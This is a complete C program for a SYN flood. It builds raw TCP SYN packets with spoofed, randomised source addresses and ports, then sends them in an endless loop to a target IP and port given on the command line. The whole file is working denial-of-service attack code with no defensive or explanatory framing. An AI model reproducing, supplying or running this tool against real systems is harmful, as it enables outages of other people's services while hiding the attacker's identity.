#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>

// Checksum implementation
unsigned short checksum(unsigned short *ptr, int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1)
    {
        oddbyte = 0;
        *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return (answer);
}

unsigned short tcp_checksum(const struct iphdr *iph, const struct tcphdr *tcph, const char *payload, int payload_len)
{
    struct pseudo_header
    {
        unsigned int source_address;
        unsigned int dest_address;
        unsigned char placeholder;
        unsigned char protocol;
        unsigned short tcp_length;
    };

    struct pseudo_header psh;
    psh.source_address = iph->saddr;
    psh.dest_address = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + payload_len);

    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + payload_len;
    char *pseudogram = malloc(psize);

    memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
    memcpy(pseudogram + sizeof(struct pseudo_header) + sizeof(struct tcphdr), payload, payload_len);

    unsigned short result = checksum((unsigned short *)pseudogram, psize);
    free(pseudogram);
    return result;
}

int create_raw_socket()
{
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    int hincl = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

    if (fd < 0)
    {
        perror("Error creating raw socket");
        exit(1);
    }

    return fd;
}

int main(int argc, char *argv[])
{
    if (argc != 3)
    {
        printf("Usage: sudo %s <IP> <PORT>\n", argv[0]);
        exit(1);
    }

    // Set destination IP and port from command line arguments
    char *dest_ip;
    int dest_port;

    dest_ip = argv[1];
    dest_port = atoi(argv[2]);

    // More info: https://linuxtips.ca/index.php/2022/05/06/create-syn-flood-with-raw-socket-in-c/
    char source_ip[sizeof "255.255.255.255"];
    snprintf(source_ip, 16, "%lu.%lu.%lu.%lu", random() % 255, random() % 255, random() % 255, random() % 255);
    int source_port = random() % 65535;

    int fd = create_raw_socket();

    // Destination IP
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(dest_port);
    dest.sin_addr.s_addr = inet_addr(dest_ip);

    // More info: https://www.binarytides.com/raw-udp-sockets-c-linux/
    char packet[65536], *data;
    memset(packet, 0, 65536);

    // IP header pointer
    struct iphdr *iph = (struct iphdr *)packet;

    // TCP header pointer
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr)); // TCP header

    // data section pointer
    data = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);

    memset(packet, 0, 65536);

    // fill the IP header here
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = htonl(0); // Id of this packet
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;       // TCP protocol
    iph->check = 0;                    // Set to 0 before calculating checksum
    iph->saddr = inet_addr(source_ip); // Spoof the source ip address
    inet_pton(AF_INET, dest_ip, &(iph->daddr));
    iph->check = checksum((unsigned short *)packet, sizeof(struct iphdr));

    // fill the TCP header
    tcph->source = htons(source_port);
    tcph->dest = htons(dest_port);
    tcph->seq = random();
    tcph->ack_seq = 0;
    tcph->res1 = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(65535);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    // Calculate TCP checksum
    tcph->check = tcp_checksum(iph, tcph, data, 0);

    printf("Syn-flooding %s:%d...\n", dest_ip, dest_port);

    sleep(2);

    while (1)
    {
        if (sendto(fd, packet, ntohs(iph->tot_len), 0, (struct sockaddr *)&dest, sizeof(dest)) < 0)
        {
            perror("Sendto failed");
        }

        // Randomize source IP and source port in every send
        snprintf(source_ip, 16, "%lu.%lu.%lu.%lu", random() % 255, random() % 255, random() % 255, random() % 255);
        iph->saddr = inet_addr(source_ip);
        iph->check = 0;
        iph->check = checksum((unsigned short *)packet, sizeof(struct iphdr));
        tcph->source = htons(random() % 65535);
        tcph->check = 0;
        tcph->check = tcp_checksum(iph, tcph, data, 0);
    }
    printf("\n");

    return 0;
}
